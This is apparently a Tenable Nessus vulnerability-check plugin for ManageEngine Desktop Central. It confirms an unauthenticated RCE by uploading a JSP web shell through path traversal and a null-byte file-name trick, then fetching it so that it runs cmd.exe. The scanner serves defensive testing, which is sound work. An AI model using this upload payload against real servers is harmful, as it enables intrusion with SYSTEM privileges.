#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(90193);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2016/04/28 18:52:11 $");

  script_cve_id("CVE-2015-82001");
  script_osvdb_id(131711);
  script_xref(name:"TRA", value:"TRA-2015-07");

  script_name(english:"ManageEngine Desktop Central statusUpdate Arbitrary File Upload RCE (intrusive check)");
  script_summary(english:"Uploads a file to execute arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java-based web application that is
affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The ManageEngine Desktop Central application running on the remote
host is affected by a flaw in the statusUpdate script due to a failure
to properly sanitize user-supplied input to the 'fileName' parameter.
An unauthenticated, remote attacker can exploit this, via a crafted
request to upload a JSP file that has multiple file extensions and by
manipulating the 'applicationName' parameter, to make a direct request
to the uploaded file, resulting in the execution of arbitrary code
with NT-AUTHORITY\SYSTEM privileges.

Note that this plugin attempts to upload a JSP file to <DocumentRoot>
(i.e., C:\ManageEngine\DesktopCentral_Server\webapps\DesktopCentral\)
and then fetch it, thus executing the Java code in the JSP file. The
plugin attempts to delete the JSP file after a successful upload and
fetch. However, the user is advised to delete the JSP file if Nessus
fails to delete it.

The application is reportedly also affected by an additional
unspecified remote code execution vulnerability; however, Nessus has
not tested for this issue.");
# https://www.manageengine.com/products/desktop-central/remote-code-execution.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?89099720");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ManageEngine Desktop Central version 9 build 91100 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/12/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/12/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/03/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zohocorp:manageengine_desktop_central");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("manageengine_desktop_central_detect.nbin");
  script_require_ports("Services/www", 8020, 8383, 8040);
  script_require_keys("installed_sw/ManageEngine Desktop Central");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:8020);

# This is the JSP file the plugin tries to upload to <DocumentRoot>.
file = SCRIPT_NAME - ".nasl" + ".jsp";

# File name used to pass checks on the 'fileName' parameter
# When the StatusUpdateServlet tries to create <file_pass>, 
# <file> will be created instead because the "%00" null byte
# will terminate the file name before the ".log" extension.
file_pass = file + "%00.log";

# Command to run
cmd = "cmd.exe /C ipconfig /all && del ..\\\\webapps\\\\DesktopCentral\\\\" + file;
# This is the Java code put in the JSP file.
postdata =
  '<%@ page import="java.io.*" %>\n' +
  '<%\n' +
  'String output = "";\n' +
  'String s = null;\n' +
  '  try {\n' +
  '     Process p = Runtime.getRuntime().exec("' + cmd + '");\n' +
  '      BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));\n' +
         'while((s = sI.readLine()) != null) {\n' +
         '  output += "\\n"+ s;\n' +
         '}\n' +
      '}\n' +
      'catch(IOException e) {\n' +
      '   e.printStackTrace();\n' +
      '}\n' +
  '%>\n' +
  '\n' +
  '<pre>\n <%=output %>\n </pre>\n';

url = "/statusUpdate?" +
    "actionToCall=3" +
    "&actions=2" +
    "&domainName=Nessus_dom" +              # Agent domain/workgroup
    "&customerId=1" +
    "&configDataID=1" +     # This field gets mapped to a collectionID 
    "&computerName=" + this_host_name() +   # Agent host name
    # Status update from system tools on the agent is saved in
    # <DocumentRoot>/server-data/<customerId>/Tools-Log/
    # <collectionID>/<computerName>/<applicationName>/. 
    # This directory gets created if it doesn't exist.
    # The 'applicationName' field is not sanitized and we can take
    # advantage of this fact to drop the JSP file in <DocumentRoot>. 
    '&applicationName=../../../../../' +
    "&fileName=" + file_pass;

res = http_send_recv3(
  port            : port,
  method          : "POST",
  item            : url,
  data            : postdata,
  content_type    : "text/html",
  exit_on_fail    : TRUE
);

# Vulnerable server should return 200
if(res[0] !~ "^HTTP/[0-9.]+ 200")
{
  # Patched server returns 403
  if (res[0] =~ "^HTTP/[0-9.]+ 403")
  {
    audit(AUDIT_LISTEN_NOT_VULN, "ManageEngine Desktop Central", port);
  }
  # Unexpected
  else
  {
    audit(AUDIT_RESP_BAD, port, 'a status update message, return HTTP status: ' + res[0]);
  }
}

req1 = http_last_sent_request();

# Try to fetch our uploaded JSP file. If the file was successfully 
# uploaded, the Java code in it will be executed and the output will
# be sent back in the HTTP response.
res2 = http_send_recv3(
  method : "GET",
  port   : port,
  item   : "/" + file,
  exit_on_fail : TRUE
);

req2 = http_last_sent_request();

# Vulnerable: see part of output of the 'ipconfig' command 
if ("Subnet Mask" >< res2[2])
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    request    : make_list(req1, req2),
    output     : res2[2],
    generic    : TRUE
  );
}
# Unexpected
else
  audit(AUDIT_RESP_BAD, port, 'a request to fetch ' + file + ', HTTP response: \n' + res2[0] + res2[1] + res2[2]);
